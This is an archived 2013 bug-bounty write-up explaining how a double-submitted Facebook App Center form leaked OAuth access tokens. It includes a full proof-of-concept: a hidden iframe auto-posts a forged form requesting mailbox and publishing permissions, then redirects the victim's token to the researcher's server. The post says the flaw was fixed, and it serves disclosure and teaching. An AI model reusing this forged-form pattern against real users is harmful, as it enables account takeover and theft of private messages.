---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2013-04-13_stealing-facebook-access-tokens-with-a-double-submit.md
original_filename: 2013-04-13_stealing-facebook-access-tokens-with-a-double-submit.md
title: Stealing Facebook Access Tokens with a Double Submit
category: documents
detected_topics:
- oauth
- xss
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- oauth
- xss
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: 646c813279bb1bc3fd4115377f0c165a2279b9a8f247e514efa18b9f8f2a90e1
text_sha256: 01abbd414f75d34262d9dba382f6d6cce29bcc6470444b928489eb0d48c7c442
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Stealing Facebook Access Tokens with a Double Submit

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2013-04-13_stealing-facebook-access-tokens-with-a-double-submit.md
- Source Type: markdown
- Detected Topics: oauth, xss, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `646c813279bb1bc3fd4115377f0c165a2279b9a8f247e514efa18b9f8f2a90e1`
- Text SHA256: `01abbd414f75d34262d9dba382f6d6cce29bcc6470444b928489eb0d48c7c442`


## Content

---
title: "Stealing Facebook Access Tokens with a Double Submit"
page_title: "Stealing Facebook Access Tokens with a Double Submit – Jack"
url: "https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/"
final_url: "https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Meta / Facebook"]
bugs: ["CSRF", "OAuth"]
publication_date: "2013-04-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6407
---

# [Stealing Facebook Access Tokens with a Double Submit](https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/ "Stealing Facebook Access Tokens with a Double Submit")

## April 13, 2013

__Reading time ~2 minutes

After the [wave](http://www.breaksec.com/?p=5734) [of](http://www.breaksec.com/?p=5753) [OAuth](http://homakov.blogspot.co.uk/2013/02/hacking-facebook-with-oauth2-and-chrome.html) [bugs](http://homakov.blogspot.co.uk/2013/03/redirecturi-is-achilles-heel-of-oauth.html) reported recently, It’s my turn to present a just as serious (but slightly less complicated) issue.

On the Facebook App Center, we have links to numerous different apps. Some have a “Go to App” button, for apps embedded within Facebook, and others have a “Visit Website” button, for sites which connect with Facebook. The “Visit Website” button submits a POST request to `ui_server.php`, which generates an access token and redirects you to the site.

[ ![](/images/facebookauth/facebook-auth-1-1.png) ](/images/facebookauth/facebook-auth-1-1.png)

The form is interesting in that it doesn’t present a permissions dialog (like you would have when requesting permissions via `/dialog/oauth`). This is presumably because the request has to be initiated by the user (due to the presence of a CSRF token), and because the permissions required are listed underneath the button.

During testing, I noticed that omitting the CSRF token (`fb_dtsg`), and `orig/new_perms` generates a 500 error and doesn’t redirect you. This is expected behaviour.

However, in the background, an access token _is_ generated. Refreshing the app’s page in the App Center and hovering over “Visit Website” shows that it is now a link to the site, with your access token included.

[ ![](/images/facebookauth/facebook-auth-2.png) ](/images/facebookauth/facebook-auth-2.png)

Using this bug, we can double-submit the permissions form to gain a valid access token. The first request is discarded - the token is generated in the background. The second request is sent after a specific interval (in my PoC I’ve chosen five seconds to be safe, but a wait of one second would suffice), which picks up the already generated token and redirects the user.

[ ![](/images/facebookauth/facebook-auth-3-1.png) ](/images/facebookauth/facebook-auth-3-1.png)

The awesome thing about this bug is that we don’t need to piggy-back off an already existing app’s permissions like in some of the other bugs, we can specify whatever ones we want (including any of the [extended_permissions](https://developers.facebook.com/docs/reference/login/extended-permissions/)).

When the user is sent to the final page, a snippet of their FB inbox is displayed, sweet! In a real-world example, the inbox would obviously not be presented, but logged.

[ ![](/images/facebookauth/facebook-auth-4-1.png) ](/images/facebookauth/facebook-auth-4-1.png)

### Full PoC
  
  
  <!-- index.html -->
  <html>
  <head></head>
  <body>
  <h3>Facebook Auth PoC - Wait 5 Seconds</h3>
  <!-- Load the form first -->
  <div id="iframe-wrap">
  <iframe src="frame.html" style="visibility:hidden;"></iframe>
  </div>
  <!-- Load the second after 5 seconds -->
  <script>
  setTimeout(function(){
  document.getElementById('iframe-wrap').innerHTML = '<iframe src="frame.html" style="width:800px;height:500px;"></iframe>';
  }, 5000);
  </script>
  </body>
  </html>
  
  <!-- frame.html -->
  <form action="https://www.facebook.com/connect/uiserver.php" method="POST" id="fb">
  <input type="hidden" name="perms" value="email,user_likes,publish_actions,read_mailbox">
  <input type="hidden" name="dubstep" value="1">
  <input type="hidden" name="new_user_session" value="1">
  <input type="hidden" name="app_id" value="359849714135684">
  <input type="hidden" name="redirect_uri" value="https://fin1te.net/fb-poc/fb.php">
  <input type="hidden" name="response_type" value="code">
  <input type="hidden" name="from_post" value="1">
  <input type="hidden" name="__uiserv_method" value="permissions.request">  
  <input type="hidden" name="grant_clicked" value="Visit Website">
  </form>
  <script>document.getElementById('fb').submit();</script>

#### Fix

Facebook has fixed this issue by redirecting any calls to `uiserver.php` without the correct tokens to `invalid_request.php`

[facebook](https://whitton.io/tags/#facebook "Pages tagged facebook")[bugbounty](https://whitton.io/tags/#bugbounty "Pages tagged bugbounty")[websec](https://whitton.io/tags/#websec "Pages tagged websec")[csrf](https://whitton.io/tags/#csrf "Pages tagged csrf") Updated on April 13, 2013 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/ "Share on Google Plus")

[Read More](https://whitton.io/archive/framing-part-1-click-jacking-etsy/)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

Published on April 03, 2016

#### [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

Published on March 22, 2016
